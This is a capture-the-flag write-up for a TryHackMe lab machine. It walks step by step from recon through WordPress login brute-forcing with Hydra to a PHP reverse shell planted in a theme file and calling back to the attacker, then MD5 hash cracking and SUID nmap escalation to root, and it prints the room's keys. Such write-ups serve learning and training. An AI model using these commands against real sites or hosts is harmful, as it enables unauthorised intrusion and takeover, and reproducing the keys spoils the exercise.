# Mr. Robot CTF — Writeup (TryHackMe)

**Room:** [Mr Robot CTF](https://tryhackme.com/room/mrrobot)
**Difficulty:** Medium
**Target IP:** 10.113.182.181
**Objective:** Find 3 hidden keys and root the machine

---

## Summary

| Key | Value |
|-----|-------|
| Key 1 | `073403c8a58a1f80d943455fb30724b9` |
| Key 2 | `822c73956184f694993bede3eb39f959` |
| Key 3 | `04787ddef27c3dee1ee161b21670b4e4` |

**Attack chain:**
```
Nmap recon → robots.txt disclosure → WordPress brute-force →
Theme Editor RCE (reverse shell) → password hash crack (lateral move to robot) →
SUID nmap privilege escalation → root
```

---

## 1. Reconnaissance

Started with a full TCP port scan to identify open services.

```bash
nmap -sC -sV -p- 10.113.182.181
```

**Results:**

| Port | Service | Version |
|------|---------|---------|
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu |
| 80   | HTTP    | Apache httpd |
| 443  | SSL/HTTP | Apache httpd |

No credentials were available for SSH, so the web application (80/443) was the logical entry point.

---

## 2. Web Enumeration

Visited the site — it rendered via JavaScript (`<div id="app">`) with no useful info in the page source.

Checked `robots.txt`, a common place developers accidentally disclose sensitive files:

```bash
curl http://10.113.182.181/robots.txt
```

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Two files of interest were directly disclosed.

---

## 3. Key 1

Fetched the file directly:

```bash
curl http://10.113.182.181/key-1-of-3.txt
```

**Key 1:** `073403c8a58a1f80d943455fb30724b9`

---

## 4. Wordlist Retrieval

Downloaded the wordlist referenced in `robots.txt` and deduplicated it:

```bash
curl http://10.113.182.181/fsocity.dic -o fsocity.dic
sort -u fsocity.dic > fsocity_unique.dic
wc -l fsocity_unique.dic
# 11,451 unique entries
```

---

## 5. WordPress Username & Login Form Discovery

The site runs WordPress. Checked `wp-login.php` form fields:

```bash
curl -s http://10.113.182.181/wp-login.php | grep -i "name=\""
```

Form fields: `log` (username), `pwd` (password), `wp-submit`.

### Discovering a valid error message

An initial `curl` POST request including `testcookie=1` only returned a generic "cookies are blocked" error, masking the real authentication response. Removing that parameter revealed the true error:

```bash
curl -s -i -d "log=elliot&pwd=wrongpassword123&wp-submit=Log+In" \
  http://10.113.182.181/wp-login.php | grep -i "error\|invalid\|incorrect"
```

```
ERROR: The password you entered for the username elliot is incorrect.
```

This confirmed the username **`elliot`** was valid (WordPress leaks this via its error message).

---

## 6. Brute-Forcing the Password (Hydra)

With username and wordlist ready, launched Hydra against the login form, using the confirmed failure string:

```bash
hydra -l elliot -P fsocity_unique.dic 10.113.182.181 http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect"
```

> **Note:** An earlier attempt using `F=Invalid username` produced false positives (16 "valid" passwords) because that string never actually appeared in the response. Identifying the correct failure condition first was essential.

**Result:**

```
[80][http-post-form] host: 10.113.182.181   login: elliot   password: ER28-0652
```

**Credentials:** `elliot : ER28-0652`

---

## 7. Gaining Code Execution via WP Admin

Logged into `/wp-login.php` as `elliot`. The dashboard confirmed WordPress 4.3.1 running the **Twenty Fifteen** theme.

Used **Appearance → Editor** to edit `404.php` (a low-traffic template, safe to overwrite), replacing its contents with `/usr/share/webshells/php/php-reverse-shell.php`, with `$ip` and `$port` updated to the attacker's VPN (tun0) address:

```php
$ip = '192.168.130.100';
$port = 4444;
```

Clicked **Update File** to save the malicious theme file.

### Catching the shell

Started a listener on the attack box:

```bash
nc -lvnp 4444
```

Triggered the payload by visiting the modified file:

```
http://10.113.182.181/wp-content/themes/twentyfifteen/404.php
```

**Shell obtained as `daemon`:**

```
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

Stabilized the shell with:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 8. Lateral Movement — daemon → robot

Enumerated `/home`:

```bash
ls -la /home/robot/
```

```
-r-------- 1 robot robot   33  key-2-of-3.txt       (unreadable as daemon)
-rw-r--r-- 1 robot robot   39  password.raw-md5      (world-readable!)
```

Read the readable file:

```bash
cat /home/robot/password.raw-md5
```

```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

### Cracking the hash

Cracked the MD5 hash offline with John the Ripper and `rockyou.txt`:

```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > robot_hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt robot_hash.txt
```

**Cracked password:** `abcdefghijklmnopqrstuvwxyz`

### Switching users

```bash
su robot
# Password: abcdefghijklmnopqrstuvwxyz
cat /home/robot/key-2-of-3.txt
```

**Key 2:** `822c73956184f694993bede3eb39f959`

---

## 9. Privilege Escalation — robot → root

Searched for SUID binaries (files that execute with the owner's privileges, often root):

```bash
find / -perm -4000 -type f 2>/dev/null
```

Notable result:

```
/usr/local/bin/nmap
```

An SUID `nmap` binary is unusual and a well-known escalation vector in older Nmap versions (v3.81 here), which support an interactive mode that can spawn a shell:

```bash
nmap --interactive
nmap> !sh
```

This dropped into a **root shell**:

```bash
whoami
# root

cd /root
cat key-3-of-3.txt
```

**Key 3:** `04787ddef27c3dee1ee161b21670b4e4`

---

## Lessons Learned

- **`robots.txt` is an easy early win** — always check it before deeper enumeration.
- **Error messages can leak information.** WordPress's "password is incorrect" message confirmed username validity, enabling a focused brute-force instead of guessing both username and password.
- **Validate brute-force failure/success conditions before trusting results** — a wrong `F=` string in Hydra produced false positives.
- **Admin-level WordPress access equals code execution** — Theme/Plugin editors are a direct path to a reverse shell when accessible.
- **Permission-denied isn't the end of the road** — nearby files (like a world-readable hash file) can provide another way in.
- **SUID binary enumeration (`find / -perm -4000`) is a standard first step for privilege escalation.** Cross-reference findings with [GTFOBins](https://gtfobins.github.io/) for known exploitation techniques.

---

## Tools Used

- `nmap` — port scanning & privilege escalation
- `curl` — HTTP enumeration
- `gobuster` *(considered, not ultimately required)*
- `hydra` — HTTP form brute-forcing
- `john` (John the Ripper) — MD5 hash cracking
- `netcat (nc)` — reverse shell listener
- WordPress Theme Editor — remote code execution
